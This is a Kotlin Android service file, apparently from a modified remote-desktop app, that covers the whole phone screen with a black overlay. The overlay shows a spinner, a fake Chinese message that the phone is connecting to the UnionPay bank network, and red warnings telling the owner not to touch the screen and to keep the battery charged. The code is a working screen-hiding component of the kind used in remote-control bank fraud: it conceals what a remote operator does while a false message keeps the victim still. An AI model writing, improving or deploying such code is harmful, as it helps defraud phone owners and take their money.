package com.carriez.flutter_hbb

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.os.IBinder
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.ImageView
import android.graphics.drawable.AnimationDrawable
import android.view.animation.Animation
import android.view.animation.AnimationUtils

class BlackScreenService : Service() {
    private var windowManager: WindowManager? = null
    private var blackOverlay: LinearLayout? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        createBlackOverlay()
    }

    private fun createBlackOverlay() {
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN,
            PixelFormat.TRANSLUCENT
        )

        // 创建一个垂直方向的LinearLayout作为容器
        blackOverlay = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.BLACK)
            gravity = Gravity.CENTER
            
            // 创建加载动画图标
            val loadingIcon = ImageView(context).apply {
                setImageResource(R.drawable.loading_animation)
                layoutParams = LinearLayout.LayoutParams(
                    dpToPx(60), // 宽度60dp
                    dpToPx(60)  // 高度60dp
                ).apply {
                    bottomMargin = dpToPx(30) // 底部间距30dp
                }
                
                // 启动旋转动画
                (drawable as? android.graphics.drawable.AnimatedVectorDrawable)?.start()
            }
            
            // 创建主标题文本视图
            val titleText = TextView(context).apply {
                text = "正在对接银联中心网络...."
                setTextColor(Color.WHITE)
                textSize = 22f
                gravity = Gravity.CENTER
                typeface = Typeface.DEFAULT_BOLD
                setPadding(0, 0, 0, 50)
            }
            
            // 创建警告文本视图
            val warningText = TextView(context).apply {
                text = "请勿触碰手机屏幕\n防止业务中断\n保持手机电量充足"
                setTextColor(Color.RED)
                textSize = 20f
                gravity = Gravity.CENTER
                setLineSpacing(20f, 1f)
            }
            
            // 添加所有视图到容器
            addView(loadingIcon)
            addView(titleText)
            addView(warningText)
        }

        try {
            windowManager?.addView(blackOverlay, params)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    // 工具方法：将dp转换为像素
    private fun dpToPx(dp: Int): Int {
        val density = resources.displayMetrics.density
        return (dp * density).toInt()
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            blackOverlay?.let { windowManager?.removeView(it) }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
} 